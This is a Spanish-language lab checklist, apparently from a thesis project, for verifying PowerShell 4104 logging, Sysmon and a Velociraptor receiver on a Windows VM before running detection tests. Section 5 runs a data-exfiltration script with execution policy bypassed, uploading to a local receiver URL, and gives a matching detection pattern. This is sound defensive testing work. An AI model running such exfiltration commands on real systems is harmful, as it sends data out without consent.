# CHECKLIST_PREVIO_LOGGING_VR

Objetivo: ejecutar estas comprobaciones en la VM Windows antes de activar los artifacts `CLIENT_EVENT` y antes de lanzar `TFM_Run_All_TEC_Tests_v5.ps1`.

## 1. PowerShell Script Block Logging

Ejecutar como administrador:

```powershell
$key = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'
Get-ItemProperty -Path $key -ErrorAction SilentlyContinue |
  Select-Object EnableScriptBlockLogging,EnableScriptBlockInvocationLogging
```

Valores esperados:

```text
EnableScriptBlockLogging = 1
EnableScriptBlockInvocationLogging = 1
```

Si no aparecen, habilitar por GPO/local policy antes de la prueba. No validar P3 EVENT sin 4104.

## 2. PowerShell 4104 operativo

```powershell
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 5 |
  Select-Object TimeCreated,Id,ProviderName,Message
```

Comprobar que existen eventos `Id=4104` recientes:

```powershell
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-PowerShell/Operational'
  Id=4104
  StartTime=(Get-Date).AddHours(-2)
} | Select-Object -First 5 TimeCreated,Id,Message
```

## 3. Sysmon operativo

```powershell
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -MaxEvents 10 |
  Select-Object TimeCreated,Id,ProviderName,Message
```

Comprobar ID 1/3/11:

```powershell
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational'
  Id=1,3,11
  StartTime=(Get-Date).AddHours(-2)
} | Group-Object Id | Select-Object Name,Count
```

Nota: Sysmon ID 23/26 puede no aparecer en este entorno. No es condicion principal para TEC-008.

## 4. Receiver accesible

```powershell
Test-NetConnection 192.168.1.129 -Port 8088
```

Resultado esperado:

```text
TcpTestSucceeded : True
```

## 5. Prueba minima de 4104 para TEC-009

Antes de la campana completa puede ejecutarse una prueba unitaria controlada:

```powershell
cd C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion
powershell.exe -NoProfile -ExecutionPolicy Bypass -File ".\exfiltracion_v3.ps1" `
  -ReceiverUrl "http://192.168.1.129:8088/upload" `
  -EnableUpload `
  -TimeoutSec 60 `
  -KeepArtifacts
```

Despues comprobar 4104:

```powershell
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-PowerShell/Operational'
  Id=4104
  StartTime=(Get-Date).AddMinutes(-15)
} | Where-Object {
  $_.Message -match 'Invoke-WebRequest|-InFile|application/zip|ReceiverUrl|upload|\.zip'
} | Select-Object TimeCreated,Id,Message
```

Debe verse el cuerpo de `exfiltracion_v3.ps1` con:

```text
Invoke-WebRequest
-Method POST
-InFile
application/zip
ReceiverUrl
```

## 6. Orden correcto de validacion

1. Verificar logging 4104.
2. Verificar Sysmon.
3. Verificar receiver.
4. Importar artifacts EVENT.
5. Activar Client Event Monitoring.
6. Ejecutar runner v5.
7. Exportar eventos Velociraptor.
8. Ejecutar `TFM_Collect_Final_Evidence_v1.ps1`.

